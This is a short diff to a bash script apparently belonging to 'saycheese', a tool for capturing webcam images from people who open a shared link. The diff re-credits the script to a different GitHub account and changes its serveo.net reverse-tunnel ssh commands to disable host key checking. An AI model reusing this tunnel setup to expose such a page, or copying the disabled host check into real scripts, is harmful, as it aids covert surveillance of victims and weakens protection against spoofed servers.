@@ -15,7 +15,7 @@ printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __
 printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
 printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.1 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf " \e[1;77m v1.2 coded by github.com/Meeeeeekmuuyy/saycheese\e[0m \n"
 
 printf "\n"
 
@@ -101,11 +101,11 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3000 serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3000 serveo.net  2> /dev/null > sendlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -R 80:localhost:3000 serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3000 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 8
 fi
